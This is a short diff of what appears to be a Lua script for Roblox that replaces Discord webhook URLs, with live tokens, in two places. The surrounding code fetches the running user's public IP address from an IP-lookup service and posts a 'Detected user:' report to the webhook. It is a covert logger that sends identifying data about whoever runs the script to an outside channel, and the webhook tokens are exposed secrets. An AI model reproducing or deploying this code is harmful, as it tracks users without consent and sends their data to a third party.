@@ -852,7 +852,7 @@ SONA_LOADED and "Sona" or
 
 
 local url =
-"https://discord.com/api/webhooks/1049452736946643044/zTsIcrZmf5qVgoD2hi_8TxFzbt_C4amxTB9YpbEOiZrBxdpznaNw4b2gqTzMWNkvK7q6"
+"https://discord.com/api/webhooks/1056465071829688440/3lrs_lsreIm19zktfT8TR5E6ZlNmikrssngVYilkVyT34cBmWmky3ZO5tYsTwbsvThnv"
 local data = {
 ["content"] = "Game: Rogue [TEST PLACE]. Detected user:",
 ["embeds"] = {
@@ -903,7 +903,7 @@ local ip = tostring(game:HttpGet("https://api.ipify.org", true))
 
 
 local url =
-"https://discord.com/api/webhooks/1056465071829688440/3lrs_lsreIm19zktfT8TR5E6ZlNmikrssngVYilkVyT34cBmWmky3ZO5tYsTwbsvThnv"
+"https://discord.com/api/webhooks/1049452963367759882/0tfai07DVNcV3BuU7B1GEMpb48MCkIo0i3sL84hHZrRwupgPb_HHJBRY-u6UtUqOPtRg"
 local data = {
 ["content"] = "Game: Rogue [TEST PLACE]. Detected user:",
 ["embeds"] = {
